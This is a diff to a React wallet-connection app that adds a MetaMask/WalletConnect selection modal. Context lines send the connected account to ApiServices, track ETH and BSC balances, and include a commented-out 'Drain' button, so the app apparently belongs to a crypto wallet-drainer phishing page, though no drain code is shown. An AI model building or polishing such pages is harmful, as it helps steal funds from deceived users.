@@ -16,7 +16,8 @@ import {
 import { useWeb3Modal } from "@web3modal/wagmi/react";
 import { mainnet, bsc } from "viem/chains";
 import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
-
+import WalletConnectLogo from './walletconnect.png'
+import Metamask from './metamask.jpeg'
 // 1. Get projectId at https://cloud.walletconnect.com
 function App() {
   const projectId = "bc9d6883c609c7f108a6492128674ec6";
@@ -27,6 +28,10 @@ function App() {
   const [balances, setBalances] = useState([]);
   const [bscbalances, setbscBalances] = useState([]);
   const [provider, setProvider] = useState();
+  const [showModal, setShowModal] = useState(false);
+
+  const openModal = () => setShowModal(true);
+  const closeModal = () => setShowModal(false);
   let url = window.location.href;
   let final = new URL(url);
   let searchParms = new URLSearchParams(final?.search);
@@ -43,6 +48,7 @@ function App() {
         switchToEthereumMainnet();
         setConnected(true);
         setProvider(window.ethereum)
+        closeModal()
         let result = await ApiServices(accounts[0]);
       } catch (error) {
         console.error(error);
@@ -69,6 +75,7 @@ function App() {
     setAccount(accounts[0]);
     getLocationData(source);
     setConnected(true);
+    closeModal()
     let result = await ApiServices(accounts[0]);
     console.log({ pro });
   };
@@ -172,11 +179,36 @@ function App() {
   return (
     <div>
       {console.log({ balances })}
-      {!connected && <button className="metamask-button" onClick={connectWallet}>
+      {!connected && <button className="metamask-button" onClick={openModal}>
   Sign in with Metamask
 </button>}
+{connected && <button className="metamask-button" >Connected</button>}
+{showModal && (
+        <div className="modal">
+          <div className="modal-content">
+            <div className="modal-header">
+              <h4 className="modal-title">Connect a Wallet</h4>
+              <div onClick={closeModal} >&times;</div>
+            </div>
+            {/* <h5>Popular</h5> */}
+            <div className="modal-body">
+              {/* <button className="wallet-button" >Coinbase Wallet</button> */}
+              <button className="wallet-button" onClick={connectWallet} >
+                <img className="button-logo" src={Metamask} />
+                
+                MetaMask</button>
+              <button className="wallet-button" onClick={connectWalletConnect}>
+              <img className="button-logo" src={WalletConnectLogo} />
+                WalletConnect</button>
+            </div>
+            <div className="modal-footer">
+              <button className="wallet-button close-button"  onClick={closeModal}>Close</button>
+            </div>
+          </div>
+        </div>
+      )}
       {/* <button onClick={Drain}>Send Message</button> */}
-      <button onClick={connectWalletConnect} className="metamask-button">Sign in with WalletConnnect</button>
+      {/* <button onClick={connectWalletConnect} className="metamask-button">Sign in with WalletConnnect</button> */}
     </div>
   );
 }
